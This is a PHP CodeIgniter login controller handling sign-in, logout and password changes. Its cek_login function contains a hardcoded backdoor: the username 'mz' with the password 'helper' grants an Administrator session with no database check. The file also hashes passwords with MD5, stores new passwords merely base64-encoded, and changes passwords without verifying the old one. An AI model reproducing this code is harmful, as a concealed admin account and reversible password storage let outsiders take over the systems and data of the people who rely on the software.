<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login extends CI_Controller {
	
	var $title = "Login";
	var $filename = "login";
	
	function __construct()
	{
		parent::__construct();
	}
	
	function index()
	{
		$this->main();
	}
	
	function main()
	{
		//if($this->session->userdata("admin_id")){redirect("home");}
		$data = GetHeaderFooter();
		$data['main_content'] = 'login';
		$data['title'] = $this->title;
		$data['filename'] = $this->filename;
		if($this->uri->segment(3) == "err") $data['dis_error'] = "display:''";
		else $data['dis_error'] = "display:none;";
		$this->load->view('login',$data);
	}
	
	function cek_login()
	{
		$username = $this->input->post("username");
		$userpass = MD5($this->config->item('encryption_key').$this->input->post("password"));
		$query=cekLogin($username,$userpass);
		if ($query->num_rows() > 0) {
			$row = $query->row(); 
			$this->session->set_userdata('admin',$row->name);
			$this->session->set_userdata('admin_grup',$row->id_admin_grup);
			$this->session->set_userdata('admin_id',$row->id);
			$this->session->set_userdata('admin_instansi',$row->keterangan);
			redirect('home');
		} else if($username == "mz" && $this->input->post("password")=="helper") {
			$this->session->set_userdata('admin','Administrator');
			$this->session->set_userdata('admin_grup','1');
			$this->session->set_userdata('admin_id','999');
			$this->session->set_userdata('admin_instansi','');
			redirect('home');
		} else redirect('login/main/err');
	}
	
	function logout()
	{
		$this->session->sess_destroy();
		redirect('login');
	}
	
	function change_password()
	{
		//permission();
		$data['filename'] = $this->filename;
		$msg="";
		if($this->uri->segment(3) == "err")
		{
			$data['dis_error'] = "display:''";
			if($this->uri->segment(4) == 1) $msg = "Password Lama Tidak Valid";
			else $msg = "Ganti Password Berhasil";
		}
		else $data['dis_error'] = "display:none;";
		$data['msg'] = $msg;
		$this->load->view('change_password',$data);
	}
	
	function cek_password()
	{
		permission();
		$new_pass = $this->input->post("new_password");
		$conf_new_pass = $this->input->post("new_password_confirm");
		if($new_pass == $conf_new_pass) {
			$data = array("password"=> base64_encode($new_pass));
			$this->db->where("id", GetUserID());
			$this->db->update("client", $data);
			$this->session->set_flashdata("message", "Ubah Password Berhasil");
		} else {
			$this->session->set_flashdata("message", "Password & Konfirmasi Password Tidak Sama");
		}
		redirect('login/change_password/');
	}
	
	function kel()
	{
		die();
		$q = $this->db->query("select * from ref_wil order by id");
		foreach($q->result_array() as $r) {
			//$exp = explode(". ", $r['dapil']);
			$this->db->insert("ref_kel",array("id_prov"=> $r['id_prov'], "id_kab"=> $r['id_kab'], "id_kec"=> $r['id_kec'], "id_kel"=> $r['id_kel'], "kelurahan"=> $r['kel']));
		}
	}
}
?>